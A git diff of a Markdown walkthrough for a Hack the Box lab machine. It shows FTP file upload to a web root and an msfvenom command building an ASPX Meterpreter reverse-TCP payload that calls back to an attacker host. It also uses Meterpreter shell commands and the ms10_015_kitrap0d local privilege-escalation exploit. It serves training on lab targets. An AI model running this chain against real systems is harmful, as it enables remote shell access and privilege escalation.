@@ -39,10 +39,8 @@ Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
 
 # FTP
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7c41409-5936-4da5-8464-17f3d93385d2)
-
 # HTTP
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1b24c617-3c50-4c19-a2c6-4993b136cba5)
-
 # Foothold
 - Observe that the FTP server is in the same route as the HTTP server. Which means there stands a chance if file uploads are allowed a file is uploaded via FTP and it can be then accessed directly using the browser.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a94a4267-2326-4851-9cae-7da69ae1da6e)
@@ -51,17 +49,14 @@ Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
 - Create a text file with any random name and upload it. Then access the uploaded file in the browser.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/db8bd9ae-4356-43c7-ad3d-2501ebb011a1)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3c67d341-5538-410c-aa80-6caa588743c0)
-
 ## MSFVenom
   - Generate a payload using `MSFVenom` for a reverse tcp connection to get a shell.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5e2d416c-4b86-4d87-9f23-d93e4c483f56)
 ```CSS
 ▶ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.54 LPORT=4444 -f aspx -o rsp.aspx
 ```
-
  - Upload payload.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6b8466f5-48f7-4b75-a897-3dd71973f57d)
-
 - Start listener.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f744751a-a08f-427f-8c4b-aac2ece65d46)
 ```CSS
@@ -77,18 +72,26 @@ Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
 ```CSS
 meterpreter> sysinfo
 ```
-
 - Get a upgraded shell and view system information.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cd643c8f-22be-4c47-ae52-263d0ac6520d)
 ```CSS
 meterpreter> shell
+c:\windows\system32\inetsrv>getuid
 c:\windows\system32\inetsrv>systeminfo
 ```
-
 - Exit the upgraded shell.
 - Search for exploit suggester.
 - Set session and run.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/89f9dbdf-ae82-4ea8-bdcd-da4bb09dc17b)
-
 - Suggested exploits
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5d6fae9d-2038-44c0-9fa3-84cddd61153f)
+- Use exploit
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7c4c8bbb-c2bc-4a26-82b4-509f8d41bbf2)
+```CSS
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
+```
+- Set exploit options
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5aa4005f-fa82-4802-9078-91821dc3a9c4)
+- Shell
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0f74e2a3-240b-432e-9f2f-a4dc788e8b2a)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e6477b4a-b405-4aab-ae46-13197bafc845)
